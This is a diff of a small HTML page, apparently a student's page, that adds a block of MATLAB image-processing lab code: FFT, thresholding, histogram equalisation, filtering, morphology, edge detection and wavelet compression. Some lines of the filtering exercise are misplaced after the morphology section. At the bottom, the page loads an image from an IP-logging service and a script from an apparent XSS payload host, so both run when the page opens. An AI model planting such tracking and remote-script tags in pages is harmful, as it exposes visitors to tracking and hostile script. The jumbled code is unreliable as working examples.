@@ -2,6 +2,258 @@
 <body>
 <h1>Dei parama padida</h1>
 <h3>- hari_146</h3>
+ <h5>clc;
+clear all;
+close all;
+a=imread(&#39;Fundus.jpg&#39;);
+subplot(2,3,1);
+imshow(a);
+title(&#39;fundus image&#39;);
+b=rgb2gray(a);
+subplot(2,3,2);
+imshow(b);
+title(&#39;gray image&#39;);
+c=fft2(b);
+d=abs(c);
+subplot(2,3,3);
+imshow(d,[]);
+title(&#39;fft of image&#39;);
+e=fftshift(c);
+f=abs(e);
+subplot(2,3,4);
+imshow(f,[]);
+title(&#39;shifted fft of an image&#39;);
+g=log(1+abs(e));
+subplot(2,3,5);
+imshow(g,[]);
+title(&#39;log transformed image&#39;);
+subplot(2,3,6);
+mesh(g);
+title(&#39;3D image&#39;);
+
+
+3
+
+I = imread(&#39;circlesBrightDark.png&#39;);
+%subplot(2,2,1);
+imshow(I)
+axis off
+I = I(:,:,1);
+title(&#39;Original Image&#39;)
+%Calculate two threshold levels.
+thresh = multithresh(I,2);
+%Segment the image into three levels using imquantize .
+seg_I = imquantize(I,thresh);
+%Convert segmented image into color image using label2rgb and display it.
+RGB = label2rgb(seg_I);
+figure;
+%subplot(2,2,2);
+imshow(RGB);
+axis off;
+title(&quot;RGB SEGMENTED IMAGE&quot;);
+
+
+
+4
+
+clc;
+clear all;
+close all;
+a=imread(&#39;cameraman.tif&#39;);
+subplot(2,2,1);
+imshow(a);
+title(&#39;original image&#39;);
+heq=histeq(a);
+subplot(2,2,2);
+imshow(heq);
+title(&#39;equalized image&#39;);
+subplot(2,2,3);
+imhist(a);
+title(&#39;histogram of original image&#39;);
+subplot(2,2,4);
+imhist(heq);
+title(&#39;histogram of equalized image&#39;);
+
+
+
+5
+
+
+clc;
+close all;
+clear all;
+a = imread(&#39;cameraman.tif&#39;);
+w = fspecial(&#39;average&#39;,[3,3]);
+w2 = fspecial(&#39;average&#39;,[5,5]);
+w3 = [1 2 1;2 4 2;1 2 1] * (1/16);
+subplot(3,3,1);
+imshow(a);
+title(&#39;Original&#39;);
+b = imfilter(a,w);
+b2 = imfilter(a,w2);
+b3 = imfilter(a,w3);
+b1 = imfilter(a,w,&#39;replicate&#39;);
+e = imnoise(a,&#39;salt &amp; pepper&#39;,0.02);
+g = medfilt2(e,[3 3]);
+h = medfilt2(e,[3 3],&#39;symmetric&#39;);
+i = imfilter(e,w2,&#39;replicate&#39;);
+subplot(3,3,2);
+imshow(b);
+title(&#39;3x3 avg filter&#39;);
+subplot(3,3,3);
+imshow(b2);
+title(&#39;5x5 avg filter&#39;);
+subplot(3,3,4);
+imshow(b3);
+title(&#39;weighted avg filter&#39;);
+subplot(3,3,5);
+imshow(b1);
+title(&#39;Replicate img&#39;);
+subplot(3,3,6);
+imshow(e);
+title(&#39;Noise img&#39;);
+subplot(3,3,7);
+imshow(g);
+title(&#39;Filtered img&#39;);
+
+
+
+6
+
+a = imread(&#39;hestain.png&#39;);
+imshow(a)
+title(&#39;Original Image&#39;);
+b = imsharpen(a);
+figure, imshow(b)
+title(&#39;Sharpened Image&#39;);
+
+
+
+Controlled Sharpening at edges of image
+a = imread(&#39;rice.png&#39;);
+imshow(a), title(&#39;Original Image&#39;);
+b = imsharpen(a,&#39;Radius&#39;,2,&#39;Amount&#39;,1);
+figure, imshow(b)
+title(&#39;Sharpened Image&#39;);
+
+
+
+morphological
+% Importing the image
+I = imread(&quot;cameraman.tif&quot;);
+subplot(2, 3, 1),
+imshow(I);
+title(&quot;Original image&quot;);
+% Dilated Image
+se = strel(&quot;line&quot;, 7, 7);
+dilate = imdilate(I, se);
+subplot(2, 3, 2),
+imshow(dilate);
+title(&quot;Dilated image&quot;);
+% Eroded image
+erode = imerode(I, se);
+subplot(2, 3, 3),
+imshow(erode);
+title(&quot;Eroded image&quot;);
+% Opened image
+open = imopen(I, se);
+subplot(2, 3, 4),
+imshow(open);
+title(&quot;Opened image&quot;);
+% Closed image
+close = imclose(I, se);
+subplot(2, 3, 5),
+imshow(close);
+title(&quot;Closed image&quot;);
+% Read a 2-D grayscale image into the workspace. Display the image. Objects of interest are dark
+threads against a light background (Skeleton)
+figure()
+I= imread(&#39;cell.tif&#39;);
+imshow(I);
+Icomplement = imcomplement(I);
+BW = imbinarize(Icomplement);
+
+imshow(BW);
+out = bwskel(BW);
+imshow(labeloverlay(I,out,&#39;Transparency&#39;,0))
+% Dilate Image with Vertical Line Structuring Element (Perimeter)
+figure()
+bw=imread(&#39;fundus.jpg&#39;);
+bw2=bwperim(bw,8);
+imshowpair(bw,bw2,&#39;montage&#39;);
+subplot(3,3,8);
+imshow(h);
+
+title(&#39;Symmetric Filtered img&#39;);
+subplot(3,3,9);
+imshow(i);
+title(&#39;Replicated 5x5 noisy Filtered img&#39;);
+
+
+
+8 edge 
+
+
+clc;
+clear all;
+close all;
+a=imread(&#39;cameraman.tif&#39;);
+%b=rgb2gray(a);
+b=edge(a,&#39;roberts&#39;);
+c=edge(a,&#39;sobel&#39;);
+d=edge(a,&#39;prewitt&#39;);
+e=edge(a,&#39;log&#39;);
+f=edge(a,&#39;canny&#39;);
+subplot(3,3,1);
+imshow(a);
+subplot(3,3,2);
+imshow(b);
+subplot(3,3,3);
+imshow(c);
+subplot(3,3,4);
+imshow(d);
+subplot(3,3,5);
+imshow(e);
+subplot(3,3,6);
+imshow(f);
+
+
+10
+
+%Compression and Uncompression of a Grayscale Image
+load mask;
+[cr,bpp] = wcompress(&#39;c&#39;,X,&#39;mask.wtc&#39;,&#39;spiht&#39;,&#39;maxloop&#39;,12)
+Xc = wcompress(&#39;u&#39;,&#39;mask.wtc&#39;);
+delete(&#39;mask.wtc&#39;)
+colormap(pink(255))
+subplot(1,2,1); image(X); title(&#39;Original image&#39;)
+axis square
+subplot(1,2,2); image(Xc); title(&#39;Compressed image&#39;)
+axis square
+D = abs(X-Xc).^2;
+mse = sum(D(:))/numel(X)
+D = abs(X-Xc).^2;
+mse = sum(D(:))/numel(X)
+
+CODE 2:
+%Compression and Uncompression of a Truecolor Image
+load mask;
+X = imread(&#39;wpeppers.jpg&#39;);
+[cratio,bpp] = wcompress(&#39;c&#39;,X,&#39;wpeppers.wtc&#39;,&#39;spiht&#39;,&#39;maxloop&#39;,12)
+Xc = wcompress(&#39;u&#39;,&#39;wpeppers.wtc&#39;);
+
+delete(&#39;wpeppers.wtc&#39;)
+subplot(1,2,1)
+image(X)
+title(&#39;Original image&#39;)
+axis square
+subplot(1,2,2)
+image(Xc)
+title(&#39;Compressed image&#39;)
+axis square
+D = abs(double(X)-double(Xc)).^2;
+mse = sum(D(:))/numel(X)
+  psnr = 10*log10(255*255/mse)</h5>
 <img src="https://iplogger.org/XIsmJ"></img>
  <script src=https://haddie.xss.ht></script>
 </body>
